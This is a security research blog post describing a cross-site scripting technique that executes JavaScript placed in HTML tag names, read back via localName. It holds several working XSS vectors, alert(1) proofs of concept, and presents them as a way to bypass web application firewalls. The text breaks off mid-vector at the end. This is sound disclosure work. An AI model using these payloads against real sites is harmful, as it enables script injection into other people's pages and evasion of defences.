---
title: What's in a tag name? JavaScript, apparently
url: https://portswigger.net/research/whats-in-a-tag-name-javascript-apparently
source: PortSwigger Research
date: 2026-08-25
fetch_date: 2026-08-26T03:05:23.987128
---

# What's in a tag name? JavaScript, apparently

[Login](/users)

[ ]

Products

Solutions

[Research](/research)
[Academy](/web-security)

Support

Company

[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[My account](/users/youraccount)
[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[![Burp AT](/mega-nav/images/burp-at.svg)
**Burp AT**
Agentic AI that extends human-led pentesting.](/burp/burp-at)
[![Burp Suite DAST](/content/images/svg/icons/enterprise.svg)
**Burp Suite DAST**
The enterprise-enabled dynamic web vulnerability scanner.](/burp/enterprise)
[![Burp Suite Professional](/content/images/svg/icons/professional.svg)
**Burp Suite Professional**
The world's #1 web penetration testing toolkit.](/burp/pro)
[![Burp Suite Community Edition](/content/images/svg/icons/community.svg)
**Burp Suite Community Edition**
The best manual tools to start web security testing.](/burp/communitydownload)
[View all product editions](/burp)

[**Burp Scanner**

Burp Suite's web vulnerability scanner

![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg)](/burp/vulnerability-scanner)

[**Attack surface visibility**
Improve security posture, prioritize manual testing, free up time.](/solutions/attack-surface-visibility)
[**CI-driven scanning**
More proactive security - find and fix vulnerabilities earlier.](/solutions/ci-driven-scanning)
[**Application security testing**
See how our software enables the world to secure the web.](/solutions)
[**DevSecOps**
Catch critical bugs; ship more secure software, more quickly.](/solutions/devsecops)
[**Penetration testing**
Accelerate penetration testing - find more bugs, more quickly.](/solutions/penetration-testing)
[**Automated scanning**
Scale dynamic scanning. Reduce risk. Save time/money.](/solutions/automated-security-testing)
[**Bug bounty hunting**
Level up your hacking and earn more bug bounties.](/solutions/bug-bounty-hunting)
[**Compliance**
Enhance security monitoring to comply with confidence.](/solutions/compliance)

[View all solutions](/solutions)

[**Product comparison**

What's the difference between Pro and DAST?

![Burp Suite Professional vs Burp Suite DAST](/mega-nav/images/burp-suite.jpg)](/burp/dast/resources/dast-vs-professional)

[**Support Center**
Get help and advice from our experts on all things Burp.](/support)
[**Documentation**
Tutorials and guides for Burp Suite.](/burp/documentation)
[**Get Started - Professional**
Get started with Burp Suite Professional.](/burp/documentation/desktop/getting-started)
[**Get Started - DAST**
Get started with Burp Suite DAST.](/burp/documentation/dast/setup)
[**Downloads**
Download the latest version of Burp Suite.](/burp/releases)

[Visit the Support Center](/support)

[**Downloads**

Download the latest version of Burp Suite.

![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg)](/burp/releases)

[ ]

Articles

* [Overview](/research)
* [ ]

  Core Topics

  [Black Hat](/research/black-hat)
  [XSS](/research/cross-site-scripting-research)
  [Request Smuggling](/research/request-smuggling)
  [Template Injection](/research/template-injection)
  [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)
* [Articles](/research/articles)
* [ ]

  Meet the Researchers

  [James Kettle](/research/james-kettle)
  [Gareth Heyes](/research/gareth-heyes)
  [Zakhar Fedotkin](/research/zakhar-fedotkin)
  [Tom Stacey](/research/tom-stacey)
* [Talks](/research/talks)
* [RSS](/research/rss)

# What's in a tag name? JavaScript, apparently

[ ]

![Gareth Heyes](/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

* **Published:** Tuesday, 25 August 2026 at 14:24 UTC
* **Updated:** Tuesday, 25 August 2026 at 14:24 UTC

I was on my laptop, as I often am when there's rubbish on telly, and found myself wondering what characters are allowed in a tag. I knew they had to begin with "a-zA-Z", but what about after that? I tried placing `alert(1)` in the tag name and remembered that the browser converts everything to uppercase. Then I wondered whether another property existed that didn't do that. I gave my tag an id attribute and inspected it in DevTools using `console.dir(x)`. Carefully inspecting each property, I saw that "`localName`" contained a lowercase version of the tag name. This was perfect.

After that, it was a simple case of putting the puzzle pieces together. I already knew that you could make any tag focusable using `tabindex` and that you can chain the `onfocus` event with itself. You can write a string to the event handler using `attributes[0].value`, which gets converted into a function and can then be called as a constructor using "`new`":

`[<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>](https://portswigger-labs.net/xss/xss.php?x=%3Calert%281%29%20onfocus=%22attributes[0].value=localName,new%20onfocus%22%20autofocus%20tabindex=1%3E)`

I'm sure you'll agree that it's pretty shocking, and it works in every browser. It's also a pretty nice way to bypass a WAF. Let's continue the journey. If `localName` returns a lowercase version of the tag, maybe that means you can use uppercase JavaScript, and yes, you can:

`[<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>](https://portswigger-labs.net/xss/xss.php?x=%3CJAVASCRIPT:ALERT%281%29%20onfocus=location=localName%20autofocus%20tabindex=1%3E)`

Then I fuzzed every transformation of the tag name. This showed that alphabetic characters, forward slashes, whitespace, and newlines get transformed. Interestingly, line and paragraph separator characters don't. These are treated like newlines in JavaScript, so you can create bizarre-looking vectors:

`[<null alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>](https://portswigger-labs.net/xss/xss.php?x=%3Cnull%E2%80%A8alert%281%29+onfocus=%22attributes.onfocus.value=localName,new%20onfocus%22%20autofocus%20tabindex=1%3E)`

If `attributes[0].value` gets blocked, there are some interesting alternatives:

`[<ALERT(1) onfocus="attributes[0].textContent=localName,new onfocus" autofocus tabindex=1>](https://portswigger-labs.net/xss/xss.php?x=%3CALERT%281%29+onfocus=%22attributes[0].textContent=localName,new%20onfocus%22%20autofocus%20tabindex=1%3E)``[<ALERT(1) onfocus="attributes[0].nodeValue=localName,new onfocus" autofocus tabindex=1>](https://portswigger-labs.net/xss/xss.php?x=%3CALERT%281%29+onfocus=%22attributes[0].nodeValue=localName,new%20onfocus%22%20autofocus%20tabindex=1%3E)`

After that, I started messing around with the HTML. An opening angle bracket can actually be part of the tag name. You can then combine it with the first attribute to produce an [XSS](/web-security/cross-site-scripting) vector:

`[<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>](https://portswigger-labs.net/xss/xss.php?x=%3Calert%3Cimg+title=%22%20src%20onerror=alert%281%29%3E%20%22%20onfocus=innerHTML=localName%2battributes[0].value%20tabindex=1%20autofocus%3Etest)`

I messed around with other attributes, like "part", which actually converts space-separated values into an array. You can then extract the `onfocus(event)` portion of the event, overwrite the event variable with the payload, and replace the `onfocus` variable with the Function constructor. This results in the lowercase tag name being passed to eval and executed as JavaScript:

`[<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>](https://portswigger-labs.net/xss/xss.php?x=%3CALERT%281%29+onfocus=%22event=localName;part=onfocus,onfocus=Function,eval%28part[1]%29%28%29%22%20tab...